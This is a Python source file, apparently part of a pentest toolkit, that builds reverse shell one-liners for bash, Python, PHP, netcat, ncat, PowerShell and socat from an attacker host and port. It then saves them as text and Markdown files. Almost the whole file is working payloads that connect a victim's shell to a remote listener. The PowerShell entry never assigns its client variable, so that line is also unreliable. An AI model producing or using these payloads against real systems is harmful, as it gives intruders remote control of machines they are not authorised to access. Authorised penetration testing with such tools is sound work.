import datetime
import os

def generate_reverse_shell(lang, lhost, lport):
    """
    Génère une commande/payload reverse shell pour le langage/protocole demandé.
    """
    shells = {
        'bash': f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
        'python': f"python -c 'import socket,os,pty;s=socket.socket();s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'",
        'php': f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/bash -i <&3 >&3 2>&3\");'",
        'nc': f"nc -e /bin/bash {lhost} {lport}",
        'ncat': f"ncat {lhost} {lport} -e /bin/bash",
        'powershell': f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"{lhost}\",{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()",
        'socat': f"socat TCP:{lhost}:{lport} EXEC:/bin/bash"
    }
    return shells.get(lang, f"Langage non supporté: {lang}")

def export_reverse_shell(payload, lang, lhost, lport, export_base):
    # Organisation : exports/<date>/reverse_shells/
    date_dir = datetime.datetime.now().strftime("%Y%m%d")
    base_dir = os.path.join(os.getcwd(), "exports", date_dir, "reverse_shells")
    os.makedirs(base_dir, exist_ok=True)
    export_base = os.path.join(base_dir, os.path.basename(export_base))
    with open(export_base + '.txt', 'w', encoding='utf-8') as f:
        f.write(payload)
    with open(export_base + '.md', 'w', encoding='utf-8') as f:
        f.write(f"# Reverse shell {lang}\n\n")
        f.write(f"**LHOST** : {lhost}\n**LPORT** : {lport}\n\n")
        f.write(f"```{lang}\n{payload}\n```")
